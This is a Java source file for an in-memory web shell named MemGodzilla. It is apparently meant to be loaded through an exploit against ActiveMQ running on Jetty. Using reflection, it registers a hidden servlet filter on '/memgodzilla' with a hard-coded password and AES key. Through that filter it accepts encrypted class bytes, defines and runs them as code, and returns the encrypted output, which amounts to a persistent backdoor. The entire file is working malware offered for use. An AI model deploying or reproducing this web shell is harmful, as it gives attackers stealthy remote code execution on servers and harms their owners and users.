package exp;

import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import javax.servlet.*;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import javax.servlet.http.HttpSession;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.OutputStream;
import java.lang.reflect.Field;
import java.lang.reflect.Modifier;
import java.math.BigInteger;
import java.security.MessageDigest;
import java.util.EnumSet;

public class MemGodzilla extends ClassLoader implements Filter {
    private static String filterName = "GH3Filter";
    private static String url = "/memgodzilla";
    String xc = "d1b10d7a02f6d351";
    public String Pwd = "Tas9er";
    String md5;
    public String cs;
    
    public MemGodzilla() {
        this.md5 = md5(this.Pwd + this.xc);
        this.cs = "UTF-8";
		test();
	}
    
    public MemGodzilla(ClassLoader z) {
        super(z);
        this.md5 = md5(this.Pwd + this.xc);
        this.cs = "UTF-8";
    }
    
    @Override
    public void init(FilterConfig filterConfig) throws ServletException {

    }

    @Override
    public void doFilter(ServletRequest req, ServletResponse resp, FilterChain filterChain) throws IOException, ServletException {
        HttpServletRequest request = (HttpServletRequest)req;
        HttpServletResponse response = (HttpServletResponse)resp;
        //servletResponse.getWriter().write("test");
        if (request.getParameter(this.Pwd) != null) {
            try {
                HttpSession session = request.getSession();
                byte[] data = base64Decode(req.getParameter(this.Pwd));
                data = this.x(data, false);
                if (session.getAttribute("payload") == null) {
                    session.setAttribute("payload", (new MemGodzilla(this.getClass().getClassLoader())).Q(data));
                } else {
                    request.setAttribute("parameters", data);
                    ByteArrayOutputStream arrOut = new ByteArrayOutputStream();
                    Object f = ((Class)session.getAttribute("payload")).newInstance();
                    f.equals(arrOut);
                    f.equals(data);
                    response.getWriter().write(this.md5.substring(0, 16));
                    f.toString();
                    response.getWriter().write(base64Encode(this.x(arrOut.toByteArray(), true)));
                    response.getWriter().write(this.md5.substring(16));
                }
            } catch (Exception var10) {
            	System.out.println(var10);
            }

        }else{
            filterChain.doFilter(req, resp);
        }
    }

    @Override
    public void destroy() {

    }
    public Class Q(byte[] cb) {
        return super.defineClass(cb, 0, cb.length);
    }

    
    public byte[] x(byte[] s, boolean m) {
        try {
            Cipher c = Cipher.getInstance("AES");
            c.init(m ? 1 : 2, new SecretKeySpec(this.xc.getBytes(), "AES"));
            return c.doFinal(s);
        } catch (Exception var4) {
            return null;
        }
    }

    public static String md5(String s) {
        String ret = null;

        try {
            MessageDigest m = MessageDigest.getInstance("MD5");
            m.update(s.getBytes(), 0, s.length());
            ret = (new BigInteger(1, m.digest())).toString(16).toUpperCase();
        } catch (Exception var3) {
        }

        return ret;
    }

    public static String base64Encode(byte[] bs) throws Exception {
        String value = null;

        Class base64;
        try {
            base64 = Class.forName("java.util.Base64");
            Object Encoder = base64.getMethod("getEncoder", (Class[])null).invoke(base64, (Object[])null);
            value = (String)Encoder.getClass().getMethod("encodeToString", byte[].class).invoke(Encoder, bs);
        } catch (Exception var6) {
            try {
                base64 = Class.forName("sun.misc.BASE64Encoder");
                Object Encoder = base64.newInstance();
                value = (String)Encoder.getClass().getMethod("encode", byte[].class).invoke(Encoder, bs);
            } catch (Exception var5) {
            }
        }

        return value;
    }

    public static byte[] base64Decode(String bs) throws Exception {
        byte[] value = null;

        Class base64;
        try {
            base64 = Class.forName("java.util.Base64");
            Object decoder = base64.getMethod("getDecoder", (Class[])null).invoke(base64, (Object[])null);
            value = (byte[])((byte[])decoder.getClass().getMethod("decode", String.class).invoke(decoder, bs));
        } catch (Exception var6) {
            try {
                base64 = Class.forName("sun.misc.BASE64Decoder");
                Object decoder = base64.newInstance();
                value = (byte[])((byte[])decoder.getClass().getMethod("decodeBuffer", String.class).invoke(decoder, bs));
            } catch (Exception var5) {
            }
        }

        return value;
    }

    public Object ClassGetField(String fieldName, Object o) throws NoSuchFieldException, IllegalAccessException {
        Field f;
        try {
            f = o.getClass().getDeclaredField(fieldName);
        } catch (NoSuchFieldException e) {
            try{
                f = o.getClass().getSuperclass().getDeclaredField(fieldName);
            }catch (Exception e1){
                f = o.getClass().getSuperclass().getSuperclass().getDeclaredField(fieldName);
            }
        }
        f.setAccessible(true);
        return f.get(o);

    }


    public void returnState(String result){
        try {
            Thread thread = Thread.currentThread();
            Class<?> aClass = Class.forName("java.lang.Thread");
            Field target = aClass.getDeclaredField("target");
            target.setAccessible(true);
            Object transport = target.get(thread);
            Class<?> aClass1 = Class.forName("org.apache.activemq.transport.tcp.TcpTransport");
            Field socketfield = aClass1.getDeclaredField("socket");
            socketfield.setAccessible(true);
            java.net.Socket socket =(java.net.Socket) socketfield.get(transport);
            OutputStream outputStream = socket.getOutputStream();
            outputStream.write("\n".getBytes());
            outputStream.write(result.getBytes());
            outputStream.close();
        }catch (Exception e){

        }
    }

    public void test() {

        try {
        	
        	
        	
            //反射获取线程属性group Thread.currentThread().getThreadGroup() 也行
            Thread rootThread = Thread.currentThread();
            Class<?> rootThreadClass = Class.forName("java.lang.Thread");
            Field groupField = rootThreadClass.getDeclaredField("group");
            groupField.setAccessible(true);
            ThreadGroup group = (ThreadGroup) groupField.get(rootThread);
            //反射获取ThreadGroup的属性 thread[]
            Field threadsArrayField = group.getClass().getDeclaredField("threads");
            threadsArrayField.setAccessible(true);
            Thread[] threads = (Thread []) threadsArrayField.get(group);
            for (Thread thread : threads){
                if (thread.getName().contains("Session-Scheduler")){
                    Object ContextObject = ClassGetField("_context",thread.getContextClassLoader());
                    Object servletHandlerObject = ClassGetField("_servletHandler", ContextObject);
                    boolean flag = false;
                    Object[] filters = (Object[]) ClassGetField("_filters", servletHandlerObject);
                    for(Object f:filters){
                        Field fieldName = f.getClass().getSuperclass().getDeclaredField("_name");
                        fieldName.setAccessible(true);
                        String name = (String) fieldName.get(f);
                        if(name.equals(filterName)){
                            flag = true;
                            break;
                        }
                    }
                    if(flag){
                        returnState("[-] Filter " + filterName + " exists.");
                        return;
                    }

                    Class sourceClazz = null;
                    Object holder = null;
                    Field modifiers = Field.class.getDeclaredField("modifiers");
                    modifiers.setAccessible(true);
                    ClassLoader classLoader = servletHandlerObject.getClass().getClassLoader();
                    try {
                        sourceClazz = classLoader.loadClass("org.eclipse.jetty.servlet.Source");
                        Field field = sourceClazz.getDeclaredField("JAVAX_API");
                        modifiers.setInt(field, field.getModifiers() & ~Modifier.FINAL);
                        java.lang.reflect.Method method = servletHandlerObject.getClass().getMethod("newFilterHolder", sourceClazz);
                        holder = method.invoke(servletHandlerObject, field.get(null));
                    } catch (ClassNotFoundException e) {
                        sourceClazz = classLoader.loadClass("org.eclipse.jetty.servlet.BaseHolder$Source");
                        java.lang.reflect.Method method = servletHandlerObject.getClass().getMethod("newFilterHolder", sourceClazz);
                        holder = method.invoke(servletHandlerObject, Enum.valueOf(sourceClazz, "JAVAX_API"));
                    }

                    MemGodzilla memshellInject1 = this;

                    java.lang.reflect.Method setName = holder.getClass().getSuperclass().getDeclaredMethod("setName",String.class);
                    setName.setAccessible(true);
                    setName.invoke(holder,filterName);

                    java.lang.reflect.Method setFilter = holder.getClass().getDeclaredMethod("setFilter",Filter.class);
                    setFilter.setAccessible(true);
                    setFilter.invoke(holder,memshellInject1);
                    servletHandlerObject.getClass().getMethod("addFilter", holder.getClass()).invoke(servletHandlerObject, holder);


                    java.lang.reflect.Constructor constructor = servletHandlerObject.getClass().getClassLoader().loadClass("org.eclipse.jetty.servlet.FilterMapping").getDeclaredConstructor();
                    constructor.setAccessible(true);
                    Object filterMapping = constructor.newInstance();

                    java.lang.reflect.Method setFilterName = filterMapping.getClass().getDeclaredMethod("setFilterName",String.class);
                    setFilterName.setAccessible(true);
                    setFilterName.invoke(filterMapping,filterName);
                    java.lang.reflect.Method setFilterHolder = filterMapping.getClass().getDeclaredMethod("setFilterHolder",holder.getClass());
                    setFilterHolder.setAccessible(true);
                    setFilterHolder.invoke(filterMapping,holder);
                    String pathSpecs = url;

                    java.lang.reflect.Method setPathSpec = filterMapping.getClass().getDeclaredMethod("setPathSpec",String.class);
                    setPathSpec.setAccessible(true);
                    setPathSpec.invoke(filterMapping,pathSpecs);

                    filterMapping.getClass().getMethod("setDispatcherTypes", EnumSet.class).invoke(filterMapping, EnumSet.of(DispatcherType.REQUEST));
                    servletHandlerObject.getClass().getMethod("prependFilterMapping", filterMapping.getClass()).invoke(servletHandlerObject, filterMapping);
                    returnState("[*]memshell Inject successfully!");
                    break;
                }
            }
        } catch (Exception e) {
            returnState("[-]Memshell Inject Failed... :" + e.getMessage());
        }
    }

}

